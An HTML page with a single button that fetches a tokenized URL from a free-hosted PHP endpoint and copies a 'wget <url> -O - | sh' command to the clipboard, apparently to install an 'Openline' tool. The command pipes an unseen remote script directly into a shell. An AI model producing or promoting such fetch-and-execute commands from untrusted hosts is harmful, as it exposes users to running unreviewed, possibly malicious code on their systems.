<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Copy Command Button (Mobile Friendly)</title>
<style>
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background: #f7f7f7;
    font-family: Arial, sans-serif;
  }

  button {
    font-size: 20px;
    padding: 16px 32px;
    border: none;
    border-radius: 10px;
    background-color: #007bff;
    color: white;
    cursor: pointer;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    max-width: 90vw;
    width: 100%;
    transition: background-color 0.3s ease;
  }

  button:active {
    background-color: #0056b3;
  }

  @media (max-width: 480px) {
    button {
      font-size: 18px;
      padding: 14px 24px;
      border-radius: 8px;
    }
  }
</style>
</head>
<body>

<button id="copyBtn" disabled>Loading command...</button>

<script>
  let command = "";

  // Fetch the token from PHP API
  fetch('https://bjc.free.nf/free_openline/generate_token.php')
    .then(response => response.json())
    .then(data => {
      if (data.success && data.url) {
        // Prepare the full wget command with token link
        command = `wget ${data.url} -O - | sh`;
        
        const btn = document.getElementById('copyBtn');
        btn.textContent = "Copy Openline Command";
        btn.disabled = false;

        btn.addEventListener('click', () => {
          navigator.clipboard.writeText(command).then(() => {
            alert('Command copied to clipboard!');
          }).catch(() => {
            alert('Failed to copy command.');
          });
        });
      } else {
        document.getElementById('copyBtn').textContent = "Failed to load command.";
      }
    })
    .catch(() => {
      document.getElementById('copyBtn').textContent = "Error loading command.";
    });
</script>

</body>
</html>
